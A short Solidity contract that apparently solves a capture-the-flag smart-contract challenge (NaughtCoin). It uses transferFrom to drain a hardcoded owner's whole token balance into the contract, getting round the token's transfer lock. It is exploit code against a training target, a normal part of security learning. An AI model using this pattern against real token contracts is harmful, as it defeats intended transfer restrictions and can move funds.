pragma solidity ^0.6.0;

import "./default.sol";

contract SendTokens {
    address me = 0x182Af69fB08b4D08c42B68cc0d9f50b14bCbFd7a;
    NaughtCoin token = NaughtCoin(0xcB3DD404dAf6F0E3cb032124fb94f497c89E60A2);

    function send_em() public {
        token.transferFrom(me, address(this), token.balanceOf(me));
    }
}
